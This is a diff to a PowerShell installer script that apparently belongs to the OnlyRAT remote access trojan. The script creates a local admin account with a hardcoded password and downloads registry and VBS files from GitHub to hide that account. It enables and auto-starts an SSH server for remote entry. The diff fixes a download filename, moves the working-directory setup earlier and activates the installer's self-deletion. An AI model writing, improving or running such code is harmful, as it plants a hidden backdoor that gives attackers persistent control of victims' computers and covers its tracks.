@@ -29,13 +29,17 @@ $uname = random_text
 $pword = (ConvertTo-SecureString "OnlyRat123" -AsPlainText -Force)
 create_account -uname $uname -pword $pword
 
+# goto temp, make working directory
+mkdir $path
+cd $path
+
 # registry to hide local admin
 $reg_file = random_text
 Invoke-WebRequest -Uri raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/files/admin.reg -OutFile "$reg_file.reg"
 
 # visual basic script to register the registry
 $vbs_file = random_text
-Invoke-WebRequest -Uri raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/files/confirm.vbs -OutFile "$vbs_file.vbs".ps1
+Invoke-WebRequest -Uri raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/files/confirm.vbs -OutFile "$vbs_file.vbs"
 
 # install the registry
 ./"$reg_file.reg";"$vbs_file.vbs"
@@ -51,12 +55,6 @@ Start-Service sshd
 Set-Service -Name sshd -StartupType 'Automatic'
 Get-NetFirewallRule -Name *ssh*
 
-# 
-
-# goto temp, make working directory
-mkdir $path
-cd $path
-
 # self delete
-# cd $initial_dir
-# del installer.ps1
+cd $initial_dir
+del installer.ps1
